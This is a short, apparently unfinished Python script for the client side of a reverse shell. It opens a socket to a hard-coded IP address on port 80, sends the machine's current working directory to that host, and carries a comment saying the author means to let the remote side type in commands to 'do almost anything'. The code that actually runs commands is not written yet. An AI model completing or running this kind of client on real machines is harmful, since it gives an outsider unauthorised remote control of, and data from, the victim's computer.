import socket
import os
import subprocess
import sys


s = socket.socket()

Name = socket.gethostname() #Gets name of Device
Host = socket.gethostbyname("localhost")  #Gets the IPV4 Address of the Device

#get IP Address of Current Machine
Port = 80
BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
# separator string for sending 2 messages in one go
SEPARATOR = "<sep>"

# connect to the server
s.connect(('10.67.98.152', Port)) #Your IP Here. Should change to host variable at onepoint. Currently only can connect if host is exact

cwd = os.getcwd() #Sets cwd to os.getcwd()

s.send(cwd.encode()) #Sends the cwd to the Host

#Need to make it so you can just type in commands and allows to do almost anything. 

